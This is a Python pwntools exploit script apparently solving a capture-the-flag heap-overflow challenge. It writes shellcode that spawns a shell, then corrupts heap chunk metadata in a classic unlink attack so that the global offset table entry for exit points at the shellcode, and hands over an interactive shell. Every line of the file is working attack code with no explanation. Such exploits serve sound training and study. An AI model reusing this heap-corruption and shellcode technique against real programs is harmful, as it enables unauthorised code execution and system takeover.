# Reference: https://www.win.tue.nl/~aeb/linux/hh/hh-11.html
import os; os.environ["TMPDIR"] = os.path.join(os.environ['HOME'], 'tmp')
import pwn

remote_binary = "/problems/heap-overflow_1_3f101d883699357e88af6bd1165695cd/vuln"

def attack():
    pr = pwn.process([remote_binary], cwd=os.path.dirname(remote_binary))
    try:
        elf = pwn.ELF(remote_binary, False)
        payload = pwn.p32(elf.got["exit"] - 12)

        pr.readline()
        fullname = int(pr.readline())

        # fullname
        shellcode = pwn.asm("jmp skip;" + "nop;"*100 + "{} skip: nop;".format(pwn.shellcraft.i386.linux.sh())).ljust(672-4)
        shellcode += pwn.p32(73).ljust(72)
        shellcode += pwn.p32(0x101)
        print(pwn.hexdump(shellcode))
        print("shellcode length:", len(shellcode))
        pr.writelineafter("Input fullname\n", shellcode)

        # lastname
        payload = pwn.p32(0x101) # set size to 0
        payload += pwn.p32(elf.got["exit"]-12) + pwn.p32(fullname+8)
        payload = payload.ljust(256 - 4)
        payload =  "A" * (256-4) + payload + pwn.p32(0x101) # set size to 0

        print(pwn.hexdump(payload))
        print("payload length:", len(payload))
        pr.writelineafter("Input lastname\n", payload)
        pr.interactive()
    finally:
        pr.close()

attack()
